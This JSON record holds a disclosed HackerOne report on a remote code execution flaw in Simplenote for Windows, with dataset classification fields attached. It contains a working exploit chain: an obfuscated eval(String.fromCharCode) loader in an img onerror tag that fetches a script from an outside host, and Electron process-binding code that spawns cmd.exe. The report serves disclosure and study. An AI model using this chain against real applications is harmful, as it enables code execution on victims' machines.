{
  "reported_to": "Automattic",
  "reported_by": "ysx ",
  "title": "[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron",
  "content": "\nHi,\nA carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file.\nThe nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to \"preview\" the Markdown-formatted note.\nSteps to reproduce\nPrerequisites\nA standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider ysx.bz the \"adversary\" server.\nCreate a new JavaScript file (herein referred to as hackerone-electron.js) in the root directory, such that the path would read: http://ysx.bz/hackerone-electron.js.\nExternal JavaScript file\nTo prepare our exploit, populate this file with the following JavaScript code:\nCode 534 Bytes\n1write(\"<h1>Simplenote RCE via Electron - Windows - ysx</h1>\");\n2write(\"<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>\");\n3var Process = process.binding('process_wrap').Process;\n4var proc = new Process();\n5proc.onexit = function(a,b) {};\n6var env = process.env;\n7var env_ = [];\n8for (var key in env) env_.push(key+'='+env[key]);\n9proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\nEncoding and exploitation\nNext, please open a JavaScript eval encoder and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an <img> tag as part of the crafted note.\nCode 150 Bytes\n1var js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);\nThe above example should encode as follows:\nCode 568 Bytes\n1eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))\nNext, create a new Markdown note within Simplenote for Windows, and paste the following <img> tag code.\nCode 650 Bytes\n1## Test Note\n2### HackerOne Windows RCE PoC - pops \"netplwiz\"\n3\n4<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>\nUpon selecting the Preview option of the Markdown note, the JavaScript will be executed. After several seconds, the netplwiz executable will launch on your Windows system.\nSupporting evidence\n<image_0>\n<image_1>\nVerified conditions\nAt the time of testing, I have successfully confirmed exploitability in the following environment:\nSimplenote for Windows 1.0.8\nWindows 10 x64 Home Edition\nThanks,\nYasin\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/684/6489094751adb742749c66de1ea3375dcc5dc37a/pre_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pre_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pre_exploit.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTGHAQXX7%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T182754Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICd8XsbK%2FlZJzGcmtiEcnnLjGMBQniTSBGv1IEGcDT07AiEA8HVG7Omh8FNM%2B35%2Bg%2FvktQbyv9levLhRYMpyvZeO1aUqsQUIMxADGgwwMTM2MTkyNzQ4NDkiDBFBMAHJ46Cv1STgqSqOBfIZyU0VJvrhygeWOToAnHKROmI%2FU9bw7opIUnsbXL7QqRUbI%2BnQvnnTfrRGvaZdwCw8GN7HGRDjq8%2FBUL46A5vrrGROs6L7soQawxxDDsmf6Rv%2FFuQw3g3qtyKnd5YPTxO0NHcAq1JHN5KPKNfwvIUx2S4HUKKU2cMQI9M%2BLK9p4qwauTQmZVg94jepr85U5MFTxuu%2F6gqBQNkOMP7QVq9IsUnL4VHz%2FxwauXf4GCYSZO8cmitwuUez9uUFuBFWO9sDsNM3%2BRVxDiJ76LVniHf5gs%2Bis97ekOkVExXYvF5qnQjMgmy%2Fs1JhX7plXQSvBpPNBo7Lv0JBYy4UqCv55vuTNIPfdv5B58zwEGvsqlk6l2E8CEKUj1dvbvYkb5eF3LDdqG6ipEPUY0Sp3URWrzuiDqR8Aukd5Ik9Sif%2BFkyt%2F0KJXjZEzF8T7Cd6q6C2z6pb466IFVjKxKkfQcnL2VsdqKDUxKUhZxqS3Eb7UX9qeZRsSXEqw1N9p3Lu%2FZ82ZvoapUWHVYlyFFCnyG1HK9L%2B2GBvX9JXGjljEuNZY2V71XmeVMJ2iwJICZRcynlk6jXZe9H%2F248WSdec2%2FGkCC2exafK9A20pHCE%2B9kcaD7glu7x0cQ9n8YDEroJ60eJLw%2BDd69CMs8JxPizREJlLXYNKQHK6SVRMsjwexGlEtLH4KvZTSvDYzeEOn3Wspae2J1C0UJMc7OGrNtcn11lnybTKxlCEXLzBY4KBhhBvJB%2Fuu10FUfMvWNlBXgJt7kPOXhBABEOIPcdgTt2N9CIbUr0ljM5ZNUm%2Bu3i2u726dsZ7L0MflQ41dkU37APVafUA182TZb9gugydzA%2BrpqARVGnXXWpyaWT3UdBBN6TZjCO9pC%2FBjqxAYwBDKvdrVwATdctOaAgv%2BSd5FYmwghHExktGdYvo5eDCHf1e2ZxIXJGFqCy77XDJ7QzssvcAgyhtFw8UpCMCCNeJTYx5cbNcAzhDOH3N65DzmgJcSIqnT7jMK%2FfHHyFKZ7IL0n1vjDLFCCqTso0YvJnHG8DWDZG2ui74w%2B2%2FPkShC1ok1hDAJIP%2F5LsNkbv5FuDrkqNnOPKT1SYA3oVP9nSg%2FGV5rbiZxgF6YiPV0sf5Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=816d90c03d872fadf31d8743acd34d5c25d8a8a4a54ba7c6008b9ee04b538a7b",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/685/920afb80188088455e32a4001412bf34875d5742/netplwiz_poc.png?response-content-disposition=attachment%3B%20filename%3D%22netplwiz_poc.png%22%3B%20filename%2A%3DUTF-8%27%27netplwiz_poc.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTGHAQXX7%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T182754Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICd8XsbK%2FlZJzGcmtiEcnnLjGMBQniTSBGv1IEGcDT07AiEA8HVG7Omh8FNM%2B35%2Bg%2FvktQbyv9levLhRYMpyvZeO1aUqsQUIMxADGgwwMTM2MTkyNzQ4NDkiDBFBMAHJ46Cv1STgqSqOBfIZyU0VJvrhygeWOToAnHKROmI%2FU9bw7opIUnsbXL7QqRUbI%2BnQvnnTfrRGvaZdwCw8GN7HGRDjq8%2FBUL46A5vrrGROs6L7soQawxxDDsmf6Rv%2FFuQw3g3qtyKnd5YPTxO0NHcAq1JHN5KPKNfwvIUx2S4HUKKU2cMQI9M%2BLK9p4qwauTQmZVg94jepr85U5MFTxuu%2F6gqBQNkOMP7QVq9IsUnL4VHz%2FxwauXf4GCYSZO8cmitwuUez9uUFuBFWO9sDsNM3%2BRVxDiJ76LVniHf5gs%2Bis97ekOkVExXYvF5qnQjMgmy%2Fs1JhX7plXQSvBpPNBo7Lv0JBYy4UqCv55vuTNIPfdv5B58zwEGvsqlk6l2E8CEKUj1dvbvYkb5eF3LDdqG6ipEPUY0Sp3URWrzuiDqR8Aukd5Ik9Sif%2BFkyt%2F0KJXjZEzF8T7Cd6q6C2z6pb466IFVjKxKkfQcnL2VsdqKDUxKUhZxqS3Eb7UX9qeZRsSXEqw1N9p3Lu%2FZ82ZvoapUWHVYlyFFCnyG1HK9L%2B2GBvX9JXGjljEuNZY2V71XmeVMJ2iwJICZRcynlk6jXZe9H%2F248WSdec2%2FGkCC2exafK9A20pHCE%2B9kcaD7glu7x0cQ9n8YDEroJ60eJLw%2BDd69CMs8JxPizREJlLXYNKQHK6SVRMsjwexGlEtLH4KvZTSvDYzeEOn3Wspae2J1C0UJMc7OGrNtcn11lnybTKxlCEXLzBY4KBhhBvJB%2Fuu10FUfMvWNlBXgJt7kPOXhBABEOIPcdgTt2N9CIbUr0ljM5ZNUm%2Bu3i2u726dsZ7L0MflQ41dkU37APVafUA182TZb9gugydzA%2BrpqARVGnXXWpyaWT3UdBBN6TZjCO9pC%2FBjqxAYwBDKvdrVwATdctOaAgv%2BSd5FYmwghHExktGdYvo5eDCHf1e2ZxIXJGFqCy77XDJ7QzssvcAgyhtFw8UpCMCCNeJTYx5cbNcAzhDOH3N65DzmgJcSIqnT7jMK%2FfHHyFKZ7IL0n1vjDLFCCqTso0YvJnHG8DWDZG2ui74w%2B2%2FPkShC1ok1hDAJIP%2F5LsNkbv5FuDrkqNnOPKT1SYA3oVP9nSg%2FGV5rbiZxgF6YiPV0sf5Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=08fcf79c83704fee8332cee78facae7213027c8cad00d5e05afc2d0e76921e71"
  },
  "disclosed_date": 1512153300,
  "report_url": "https://hackerone.com/reports/291539",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Set up a remote web server and create a JavaScript file (hackerone-electron.js) with malicious code that executes arbitrary commands."
    ],
    [
      2,
      "Encode a payload that loads the external JavaScript file and embed it in an <img> tag within a Markdown note in Simplenote."
    ],
    [
      3,
      "Preview the crafted note in Simplenote to trigger the execution of the malicious JavaScript, resulting in remote code execution."
    ]
  ],
  "vuln_description": "A Remote Code Execution (RCE) vulnerability in Simplenote for Windows allows an attacker to execute arbitrary code by injecting malicious JavaScript via a crafted Markdown note. The vulnerability leverages Electron's process binding to spawn system commands when the victim previews the note.",
  "reason": "The attack involves multiple components (external JavaScript, Markdown injection, Electron process binding) and requires understanding of Electron's security model and JavaScript encoding. However, the steps are straightforward once the initial setup is understood, and the interaction between components is not overly subtle.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves injecting JavaScript via Markdown parsing in Simplenote, which is not related to authentication or authorization boundaries. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, which does not apply to this RCE vulnerability.",
    "is_detectable": false
  }
}